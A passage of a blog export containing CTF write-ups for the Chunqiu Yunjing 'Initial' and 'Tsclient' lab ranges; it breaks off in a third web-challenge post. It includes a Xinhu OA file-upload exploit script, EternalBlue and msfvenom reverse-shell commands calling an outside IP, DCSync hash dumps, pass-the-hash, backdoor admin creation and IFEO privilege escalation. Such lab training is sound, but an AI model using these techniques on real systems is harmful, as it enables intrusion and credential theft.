[{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"./assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"./assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"./assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 这台机子不出网，我们可以通过共享文件夹的方式来传文件\n这里我是用第一台机子(172.22.8.18)，将文件夹C:/xrntkk共享给(172.22.8.46)\n在46上Win+R并输入\n\\\\172.22.8.18 输入18共享文件的账号密码即可\n接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 